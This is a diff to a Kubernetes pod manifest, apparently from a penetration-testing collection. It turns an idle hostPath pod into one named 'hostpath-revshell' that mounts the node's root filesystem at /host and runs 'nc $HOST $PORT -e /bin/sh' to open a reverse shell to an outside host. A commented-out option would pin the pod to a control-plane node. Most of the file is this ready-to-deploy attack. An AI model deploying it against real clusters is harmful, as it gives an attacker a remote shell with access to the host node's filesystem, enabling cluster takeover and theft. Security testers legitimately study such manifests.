@@ -1,23 +1,23 @@
 ###########################################################
-## Deploy: kubectl -n [namespace] apply -f pod-hostpath-only.yaml 
-## Access: kubectl -n [namespace] exec -it pod-hostpath -- bash
-## Remove: kubectl -n [namespace] delete -f pod-hostpath-only.yaml
+## Deploy: kubectl -n [namespace] apply -f pod-hostpath-revshell.yaml 
+## Access: kubectl -n [namespace] exec -it pod-hostpath-revshell -- bash
+## Remove: kubectl -n [namespace] delete pod-hostpath-revshell
 ###########################################################
 apiVersion: v1
 kind: Pod
 metadata:
-  name: pod-hostpath
+  name: pod-hostpath-revshell
   labels:
     app: pentest
 spec:
   containers:
-  - name: hostpath
+  - name: hostpath-revshell
     image: busybox
     volumeMounts:
     - mountPath: /host
       name: noderoot
     command: [ "/bin/sh", "-c", "--" ]
-    args: [ "while true; do sleep 30; done;" ]
+    args: [ "nc $HOST $PORT  -e /bin/sh;" ]
   # Force scheduling of your pod on control plane node by uncommenting this line and changing the name
   #nodeName: k8s-control-plane-node
   volumes:
